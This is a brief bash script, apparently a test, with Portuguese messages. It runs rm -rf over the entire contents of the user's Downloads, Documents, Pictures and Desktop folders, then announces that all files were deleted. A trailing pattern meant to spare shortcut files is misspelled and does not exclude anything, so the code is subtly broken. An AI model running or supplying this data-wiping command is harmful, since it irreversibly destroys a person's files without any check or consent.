#!/usr/bin/bash

echo teste

pasta_downloads="C:/Users/$USER/Downloads/*"
pasta_documents="C:/Users/$USER/Documents/*"
pasta_images="C:/Users/$USER/Pictures/*"
pasta_desktop="C:/Users/$USER/Desktop/*"

rm -rf $pasta_downloads $pasta_documents $pasta_images $pasta_desktop !"*.Ink"

echo "todos os ficheiros foram eliminados"
